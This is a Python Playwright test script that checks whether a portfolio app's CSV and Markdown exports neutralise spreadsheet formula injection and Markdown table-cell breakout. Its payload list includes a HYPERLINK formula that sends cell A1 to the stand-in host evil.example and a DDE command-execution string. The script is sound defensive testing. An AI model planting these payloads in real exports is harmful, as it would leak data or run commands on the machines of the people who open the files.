#!/usr/bin/env python3
"""Export safety: a cell in a spreadsheet is not a safe place for user text.

The portfolio CSV exists to be opened in Excel by a governance committee, and
every field in it is typed by whoever owns a project. Excel, LibreOffice and
Sheets treat a leading =, +, - or @ as a formula, quoted or not.

    pixi run test-exports
"""

from __future__ import annotations

import re
import sys
from pathlib import Path

from playwright.sync_api import sync_playwright

APP = Path(__file__).resolve().parent.parent / "docs" / "app" / "index.html"

PAYLOADS = [
    '=HYPERLINK("https://evil.example/?x="&A1,"Review status")',
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(A1)",
    "=cmd|'/c calc'!A0",
    "\tleading tab",
]

failures: list[str] = []


def check(name: str, condition: bool, detail: str = "") -> None:
    if condition:
        print(f"  ok    {name}")
    else:
        print(f"  FAIL  {name}{(' -- ' + detail) if detail else ''}")
        failures.append(name)


def md_cells(row: str) -> list[str]:
    """A Markdown table row split on its live pipes: a pipe preceded by an even
    number of backslashes ends a cell, one preceded by an odd number is text."""
    cells, cell, slashes = [], "", 0
    for ch in row.strip():
        if ch == "|" and slashes % 2 == 0:
            cells.append(cell)
            cell = ""
        else:
            cell += ch
        slashes = slashes + 1 if ch == "\\" else 0
    cells.append(cell)
    return cells[1:-1]  # the row starts and ends with a pipe


def main() -> int:
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        page.goto(APP.as_uri())
        page.wait_for_timeout(400)

        for payload in PAYLOADS:
            cell = page.evaluate("v => csvField(v)", payload)
            check(
                f"defanged: {payload[:28]!r}",
                cell.startswith("\"'"),
                f"got {cell[:40]!r}",
            )
            # The original text must still be there, just inert.
            check(
                f"preserved: {payload[:28]!r}",
                payload.replace('"', '""') in cell,
                f"got {cell[:60]!r}",
            )

        for benign in ["Sepsis early warning", "St Elsewhere", "", "0.94", "n/a"]:
            cell = page.evaluate("v => csvField(v)", benign)
            check(
                f"untouched: {benign!r}",
                cell == f'"{benign}"',
                f"got {cell!r}",
            )

        # Quote doubling must still happen, defanged or not.
        check(
            "quotes still doubled",
            page.evaluate("""() => csvField('say "hi"')""") == '"say ""hi"""',
        )
        check(
            "null and undefined become empty",
            page.evaluate("() => csvField(null) + csvField(undefined)") == '""""',
        )

        # And the real export must carry it through.
        page.evaluate(
            """() => {
                PROJECTS = new Map([["x", normalize(Object.assign(
                    blankProject("=HYPERLINK(\\"https://evil\\",\\"x\\")"),
                    {id:"x"}))]]);
            }"""
        )
        csv = page.evaluate("() => exportCSV()")
        check(
            "exportCSV() defangs the project name",
            "\"'=HYPERLINK" in csv,
            csv.splitlines()[1][:60] if len(csv.splitlines()) > 1 else csv[:60],
        )
        # A Markdown table cell must hold whatever a writer types (#124). Escaping
        # only the pipe let a value's own "\\|" become an escaped backslash and a
        # live pipe, which ends the cell: a writer could push text into Status.
        page.evaluate("loadSamples()")
        page.wait_for_function("PROJECTS && PROJECTS.size >= 10", timeout=15000)
        page.evaluate("openProject([...PROJECTS.keys()][0], 'report')")
        page.wait_for_timeout(300)
        hostile = "GAPMARK \\| Met | forged \\"
        md = page.evaluate(
            """(v) => {
                const it = allItems()[0];
                S.items[it.id] = {status: "notmet", owner: v};
                S.metrics = [{cat: "CATMARK | x", name: "m", value: "1",
                              ci: "", pop: ""}];
                return exportMD();
            }""",
            hostile,
        )
        gap = next((r for r in md.splitlines() if "GAPMARK" in r), "")
        check(
            "a hostile value stays in its Markdown table cell",
            len(md_cells(gap)) == 5,
            f"{len(md_cells(gap))} cells",
        )
        owner = md_cells(gap)[3] if len(md_cells(gap)) == 5 else ""
        check(
            "and reads back as what was typed",
            re.sub(r"\\([\\|])", r"\1", owner.strip()) == hostile,
            owner,
        )
        metric = next((r for r in md.splitlines() if "CATMARK" in r), "")
        check(
            "a metric's category is escaped too",
            len(md_cells(metric)) == 5,
            f"{len(md_cells(metric))} cells",
        )
        check("the splitter itself counts a plain row", len(md_cells("| a | b |")) == 2)
        check(
            "and is not fooled by an escaped pipe (mutation)",
            len(md_cells(r"| a \| b | c |")) == 2,
        )
        check(
            "but is by a double backslash before a pipe (mutation)",
            len(md_cells(r"| a \\| b | c |")) == 3,
        )
        # #178: a sample checkpoint's rationale follows the decision's class, not a
        # regular expression over its wording (which missed "Retrain or revise").
        made = page.evaluate(
            """() => Object.fromEntries(["Proceed", "Continue with changes",
                "Revise and resubmit", "Stop", "Retrain or revise", "Retire"].map(d =>
                [d, buildSample({name: "x", gates: {D: [d, -1]}}, new Date())
                      .gates.D.rationale]))"""
        )
        approves = {"Proceed", "Continue with changes"}
        wrong = {
            d: r
            for d, r in made.items()
            if (r == "Met criteria for this stage.") != (d in approves)
        }
        check(
            "a sample's rationale matches whether its decision approves",
            not wrong,
            str(wrong),
        )
        browser.close()

    print()
    if failures:
        print(f"{len(failures)} check(s) failed")
        return 1
    print("export checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
